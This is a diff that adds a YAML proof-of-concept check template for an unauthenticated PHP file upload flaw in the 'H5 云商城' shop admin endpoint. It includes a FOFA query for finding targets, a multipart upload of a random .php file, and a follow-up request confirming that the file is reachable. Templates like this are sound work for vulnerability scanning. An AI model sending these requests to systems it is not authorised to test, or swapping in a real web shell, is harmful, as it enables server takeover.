@@ -1,0 +1,41 @@
+id: h5-yun-commodtiy-uploadfile
+
+info:
+  name: H5 云商城 file.php 文件上传
+  author: Superhero
+  severity: critical
+  description: |-
+    由于H5 云商城 /admin/commodtiy 接口商品图片上传处，没有对用户传入的文件进行校验和过滤判断，导致未经身份验证的远程攻击者可直接上传恶意后门文件，执行恶意代码，获取服务器权限。
+    fofa: body="/public/qbsp.php""
+  tags: fileupload
+  created: 2024/05/31
+
+set:
+  randstr: randomLowercase(10)
+  randbody: randomLowercase(30)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /admin/commodtiy/file.php?upload=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"{{randstr}}.php\"\r\n\
+        Content-Type: application/octet-stream\r\n\
+        \r\n\
+        {{randbody}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'/admin') && response.body.bcontains(b'/commodtiy')  && response.body.bcontains(b'/upload')
+    output:
+      search: '"(?P<uploadfile>[0-9]+\\.php)\"".bsubmatch(response.body)'
+      uploadfile: search["uploadfile"]
+  r1:
+    request:
+      method: GET
+      path: /admin/commodtiy/upload/{{uploadfile}}
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
